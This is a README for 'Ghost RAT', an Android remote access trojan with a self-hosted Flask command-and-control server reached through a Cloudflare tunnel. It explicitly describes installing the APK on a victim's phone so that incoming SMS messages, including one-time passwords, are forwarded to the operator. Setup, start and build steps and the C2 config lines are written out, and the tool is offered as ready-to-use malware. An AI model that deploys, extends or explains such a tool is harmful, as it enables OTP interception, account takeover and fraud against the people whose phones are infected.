# 👻 Ghost RAT — Developed Adibhai

Live SMS OTP forwarder. Self-hosted. Multi-user.
Har banda apna server chalata hai — apna port, apna URL, apna AUTH_KEY.
**Koi data shared nahi.**

---

## Components

- `termux-server/` — Flask C2 server. Termux, Linux, VPS pe chalta hai.
- `apk/` — Android client (AIDE Pro buildable).
- `setup.sh` — ek baar ka setup.
- `start.sh` — server + tunnel chalu.
- `stop.sh` — sab band.

---

## Quick start

### 1. Clone

```bash
git clone https://github.com/YOUR_USERNAME/ghost-rat.git
cd ghost-rat
```

### 2. One-time setup

```bash
bash setup.sh
```

Ye poochega:
- Apna naam
- Port (default 8443)
- AUTH_KEY (khali chhodo to auto-generate)

### 3. Server chalao

```bash
bash start.sh
```

Terminal pe ye dikhega:
```
============================================================
  SERVER READY
============================================================

  APK ke assets/config.txt me ye daalo:

    C2_HOST=abc-def-ghi.trycloudflare.com
    C2_PATH=/ghost
    AUTH_KEY=x7Kp9mN2...

============================================================
```

### 4. APK build karo

`apk/README.md` dekho. Sirf `config.txt` me upar wali 3 lines daalo.

### 5. Band karo

```bash
bash stop.sh
```

---

## Kaise kaam karta hai

1. Banda `setup.sh` chalata hai — apna AUTH_KEY generate hota hai.
2. `start.sh` server + Cloudflare tunnel dono chalu karta hai.
3. Unique URL milta hai, wahi APK me daalta hai.
4. APK victim ke phone me install.
5. SMS aate hi uske apne server pe forward.
6. `AUTH_KEY` mismatch → 403. Koi doosra access nahi kar sakta.

---

## Docs

- [Setup guide](docs/setup.md)
- [APK build](docs/apk-build.md)

## License

MIT — see LICENSE.

**Developed Adibhai.**
